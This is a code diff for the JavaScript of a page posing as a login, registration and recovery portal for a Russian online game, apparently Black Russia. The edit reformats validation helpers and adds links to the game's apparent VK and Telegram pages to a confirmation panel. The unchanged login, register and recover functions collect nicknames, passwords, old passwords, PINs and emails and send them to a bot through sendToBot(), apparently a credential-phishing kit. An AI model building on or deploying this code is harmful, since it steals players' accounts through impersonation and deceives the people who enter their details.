@@ -24,51 +24,28 @@ if (loader && main) {
     }, 30);
 }
 
-function onlyEnglish(input) {
-    input.value = input.value.replace(/[^A-Za-z0-9_]/g, '');
-}
-
-function checkPassword() {
-    const pass = document.getElementById('password') || document.getElementById('new_password');
-    const icon = document.getElementById('iconPass') || document.getElementById('iconNewPass');
-    if (!pass || !icon) return;
-
-    const valid = /^[A-Za-z]{7,}$/.test(pass.value);
-
-    if (valid) {
-        icon.classList.remove('red');
-        icon.classList.add('green');
-    } else {
-        icon.classList.remove('green');
-        icon.classList.add('red');
-    }
-}
-
-function validatePassword(pass) {
-    return /^[A-Za-z]{7,}$/.test(pass);
-}
-
-function validateNick(nick) {
-    return /^[A-Z][a-z]+_[A-Z][a-z]+$/.test(nick) && nick.length >= 5;
-}
+function onlyEnglish(input) { input.value = input.value.replace(/[^A-Za-z0-9_]/g, ''); }
+function onlyPin(input) { input.value = input.value.replace(/[^0-9]/g, '').slice(0, 4); }
 
 function checkNick() {
     const nick = document.getElementById('nick').value.trim();
     const icon = document.getElementById('iconNick');
     if (!icon) return;
-    const valid = validateNick(nick);
-    if (valid) {
-        icon.classList.remove('red');
-        icon.classList.add('green');
-    } else {
-        icon.classList.remove('green');
-        icon.classList.add('red');
-    }
+    const valid = /^[A-Z][a-z]+_[A-Z][a-z]+$/.test(nick) && nick.length >= 5;
+    if (valid) { icon.classList.remove('red'); icon.classList.add('green'); }
+    else { icon.classList.remove('green'); icon.classList.add('red'); }
 }
+function validateNick(nick) { return /^[A-Z][a-z]+_[A-Z][a-z]+$/.test(nick) && nick.length >= 5; }
 
-function onlyPin(input) {
-    input.value = input.value.replace(/[^0-9]/g, '').slice(0, 4);
+function checkPassword() {
+    const pass = document.getElementById('password') || document.getElementById('new_password');
+    const icon = document.getElementById('iconPass') || document.getElementById('iconNewPass');
+    if (!pass || !icon) return;
+    const valid = /^[A-Za-z]{7,}$/.test(pass.value);
+    if (valid) { icon.classList.remove('red'); icon.classList.add('green'); }
+    else { icon.classList.remove('green'); icon.classList.add('red'); }
 }
+function validatePassword(pass) { return /^[A-Za-z]{7,}$/.test(pass); }
 
 function togglePin() {
     const checkbox = document.getElementById('hasPin');
@@ -92,7 +69,6 @@ function toggleServerList() {
     const dropdown = document.getElementById('serverDropdown');
     if (dropdown) dropdown.classList.toggle('active');
 }
-
 function selectServer(value) {
     const valueEl = document.getElementById('serverValue');
     const hiddenInput = document.getElementById('server');
@@ -127,6 +103,13 @@ function showReceipt(nick, server, type) {
             <div class="receipt-status" id="receiptStatus">
                 <div class="receipt-status-text" id="statusText">Пожалуйста подождите...</div>
                 <div class="receipt-bar"><div class="receipt-bar-fill" id="receiptBar"></div></div>
+            </div>
+            <div class="receipt-social-title">Следи за нашими соцсетями</div>
+            <div class="receipt-socials">
+                <a href="https://vk.ru/blackrussia.online" target="_blank" class="receipt-soc vk">VK</a>
+                <a href="https://t.me/br_dev" target="_blank" class="receipt-soc tg">TG</a>
+                <a href="#" class="receipt-soc ds">DS</a>
+                <a href="#" class="receipt-soc yt">YT</a>
             </div>
         </div>
     `;
@@ -164,11 +147,9 @@ function login() {
     const password = document.getElementById('password').value.trim();
     const pin = document.getElementById('pin').value.trim();
     const server = document.getElementById('server').value;
-
     if (!nick) { alert('Введите ник!'); return; }
     if (!validateNick(nick)) { alert('Ник в формате Ivan_Capone!'); return; }
     if (!validatePassword(password)) { alert('Пароль: от 7 символов, только английские буквы!'); return; }
-
     const data = `🔐 ВХОД В АККАУНТ\n\n👤 Ник: ${nick}\n🔒 Пароль: ${password}\n🛡 ПИН-код: ${pin || 'нет'}\n🌍 Сервер: ${server}`;
     sendToBot(data);
     showReceipt(nick, server, 'Вход в аккаунт');
@@ -181,11 +162,9 @@ function register() {
     const email = document.getElementById('email').value.trim();
     const server = document.getElementById('server').value;
     const referrer = document.getElementById('referrer').value.trim();
-
     if (!nick) { alert('Введите ник!'); return; }
     if (!validateNick(nick)) { alert('Ник в формате Ivan_Capone!'); return; }
     if (!validatePassword(password)) { alert('Пароль: от 7 символов, только английские буквы!'); return; }
-
     const data = `📝 РЕГИСТРАЦИЯ АККАУНТА\n\n👤 Ник: ${nick}\n🔒 Пароль: ${password}\n🛡 ПИН-код: ${pin || 'нет'}\n📧 Почта: ${email || 'нет'}\n🌍 Сервер: ${server}\n👥 Пригласил: ${referrer || 'нет'}`;
     sendToBot(data);
     showReceipt(nick, server, 'Создание аккаунта');
@@ -197,12 +176,10 @@ function recover() {
     const newPass = document.getElementById('new_password').value.trim();
     const pin = document.getElementById('pin').value.trim();
     const server = document.getElementById('server').value;
-
     if (!nick) { alert('Введите ник!'); return; }
     if (!validateNick(nick)) { alert('Ник в формате Ivan_Capone!'); return; }
     if (!oldPass) { alert('Введите старый пароль!'); return; }
     if (!validatePassword(newPass)) { alert('Новый пароль: от 7 символов, только английские буквы!'); return; }
-
     const data = `🔄 ВОССТАНОВЛЕНИЕ АККАУНТА\n\n👤 Ник: ${nick}\n🔓 Старый пароль: ${oldPass}\n🔒 Новый пароль: ${newPass}\n🛡 ПИН-код: ${pin || 'нет'}\n🌍 Сервер: ${server}`;
     sendToBot(data);
     showReceipt(nick, server, 'Восстановление аккаунта');
